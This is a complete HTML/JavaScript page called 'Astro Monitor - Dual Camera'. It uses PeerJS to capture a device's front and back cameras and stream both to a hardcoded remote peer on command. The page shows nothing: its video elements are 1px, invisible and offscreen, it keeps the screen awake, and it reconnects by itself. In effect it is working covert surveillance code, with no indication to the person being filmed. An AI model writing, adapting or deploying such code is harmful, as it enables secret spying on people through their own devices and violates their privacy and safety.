<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Monitor - Dual Camera</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="frontPreview" autoplay muted playsinline></video>
    <video id="backPreview" autoplay muted playsinline></video>

    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        
        let peer = null;
        let dataConn = null;
        let frontCall = null;
        let backCall = null;
        let frontStream = null;
        let backStream = null;
        let isActive = false;
        let wakeLock = null;
        
        let FRONT_CAMERA_ID = null;
        let BACK_CAMERA_ID = null;
        
        function log(msg) {
            console.log(`[MONITOR] ${msg}`);
        }
        
        async function detectCameras() {
            try {
                await navigator.mediaDevices.getUserMedia({ video: true });
                
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(d => d.kind === "videoinput");
                
                log(`Found ${cameras.length} camera(s):`);
                cameras.forEach((cam, i) => {
                    log(`  [${i}] ${cam.label || 'Unnamed'}`);
                    
                    const label = cam.label.toLowerCase();
                    if (label.includes("back") || label.includes("rear") || label.includes("environment")) {
                        BACK_CAMERA_ID = cam.deviceId;
                        log(`  ✅ BACK camera (${cam.label})`);
                    } else if (label.includes("front") || label.includes("user") || label.includes("face")) {
                        FRONT_CAMERA_ID = cam.deviceId;
                        log(`  ✅ FRONT camera (${cam.label})`);
                    }
                });
                
                // Fallback based on index (0 is usually back, 1 is front on many Android devices)
                if (!BACK_CAMERA_ID && cameras[0]) {
                    BACK_CAMERA_ID = cameras[0].deviceId;
                    log(`  Using camera[0] as BACK`);
                }
                if (!FRONT_CAMERA_ID && cameras[1]) {
                    FRONT_CAMERA_ID = cameras[1].deviceId;
                    log(`  Using camera[1] as FRONT`);
                }
                
                return BACK_CAMERA_ID && FRONT_CAMERA_ID;
            } catch (err) {
                log(`Camera detection failed: ${err.message}`);
                return false;
            }
        }
        
        async function getCameraStream(camera, deviceId) {
            const isBack = (camera === 'back');
            
            if (deviceId) {
                try {
                    log(`Getting ${camera} with deviceId`);
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: false,
                        video: {
                            deviceId: { exact: deviceId },
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });
                    const track = stream.getVideoTracks()[0];
                    log(`✅ ${camera} camera acquired`);
                    return stream;
                } catch (err) {
                    log(`deviceId failed: ${err.message}`);
                }
            }
            
            // Fallback
            try {
                log(`Falling back to facingMode for ${camera}`);
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: {
                        facingMode: { exact: isBack ? "environment" : "user" },
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                log(`✅ ${camera} camera acquired via facingMode`);
                return stream;
            } catch (err) {
                log(`facingMode failed: ${err.message}`);
            }
            
            return null;
        }
        
        async function startBothCameras() {
            if (isActive) {
                log('Already sending both cameras');
                return;
            }
            
            log('====== STARTING BOTH CAMERAS ======');
            callStatusMessage('Starting front camera...');
            
            try {
                // Get front camera first
                frontStream = await getCameraStream('front', FRONT_CAMERA_ID);
                if (frontStream) {
                    document.getElementById('frontPreview').srcObject = frontStream;
                    log('✅ Front camera stream ready');
                }
                
                callStatusMessage('Starting back camera...');
                
                // Get back camera
                backStream = await getCameraStream('back', BACK_CAMERA_ID);
                if (backStream) {
                    document.getElementById('backPreview').srcObject = backStream;
                    log('✅ Back camera stream ready');
                }
                
                if (frontStream && backStream) {
                    // Make calls to remote
                    log('Making calls to remote...');
                    
                    frontCall = peer.call(PARTNER_ID, frontStream, { 
                        metadata: { camera: 'front', type: 'video' } 
                    });
                    
                    backCall = peer.call(PARTNER_ID, backStream, { 
                        metadata: { camera: 'back', type: 'video' } 
                    });
                    
                    isActive = true;
                    log('✅ BOTH CAMERAS ACTIVE AND STREAMING');
                    
                    if (dataConn) {
                        dataConn.send({ type: 'dual_active' });
                    }
                } else {
                    log('Failed to get both cameras');
                    if (!frontStream) log('Front camera failed');
                    if (!backStream) log('Back camera failed');
                }
                
            } catch (err) {
                log(`Error: ${err.message}`);
            }
        }
        
        function callStatusMessage(msg) {
            if (dataConn && dataConn.open) {
                dataConn.send({ type: 'status', message: msg });
            }
        }
        
        function stopBothCameras() {
            log('Stopping both cameras...');
            
            if (frontCall) {
                frontCall.close();
                frontCall = null;
            }
            if (backCall) {
                backCall.close();
                backCall = null;
            }
            if (frontStream) {
                frontStream.getTracks().forEach(t => t.stop());
                frontStream = null;
            }
            if (backStream) {
                backStream.getTracks().forEach(t => t.stop());
                backStream = null;
            }
            document.getElementById('frontPreview').srcObject = null;
            document.getElementById('backPreview').srcObject = null;
            isActive = false;
        }
        
        async function preventScreenLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLock = await navigator.wakeLock.request('screen');
                    log('Screen wake lock acquired');
                } catch (err) {}
            }
        }
        
        function handleDataMessage(data) {
            log(`Command: ${data.type}`);
            
            if (data.type === 'start_dual') {
                log('Received start command from remote');
                startBothCameras();
            } else if (data.type === 'stop_dual') {
                stopBothCameras();
            }
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing monitor as ${MY_ID}`);
            peer = new Peer(MY_ID);
            
            peer.on('open', async () => {
                log(`✅ Monitor ACTIVE - ID: ${MY_ID}`);
                const camerasFound = await detectCameras();
                if (camerasFound) {
                    log(`Front camera ID: ${FRONT_CAMERA_ID?.substring(0, 20)}...`);
                    log(`Back camera ID: ${BACK_CAMERA_ID?.substring(0, 20)}...`);
                    log(`Ready for connection from ${PARTNER_ID}`);
                } else {
                    log('⚠️ Could not detect both cameras');
                }
            });
            
            peer.on('connection', (conn) => {
                if (conn.peer === PARTNER_ID) {
                    log(`📡 Remote connected`);
                    dataConn = conn;
                    conn.on('data', handleDataMessage);
                    conn.on('close', () => { 
                        log('Remote disconnected');
                        stopBothCameras();
                        dataConn = null;
                    });
                } else {
                    conn.close();
                }
            });
            
            peer.on('error', (err) => {
                log(`Error: ${err.type}`);
                if (err.type === 'unavailable-id') {
                    setTimeout(() => initPeer(), 5000);
                }
            });
        }
        
        log('╔════════════════════════════╗');
        log('║   ASTRO MONITOR - DUAL     ║');
        log('║   Front + Back Cameras     ║');
        log('╚════════════════════════════╝');
        
        preventScreenLock();
        initPeer();
        
        window.addEventListener('beforeunload', () => {
            stopBothCameras();
            if (peer) peer.destroy();
            if (wakeLock) wakeLock.release();
        });
    </script>
</body>
</html>
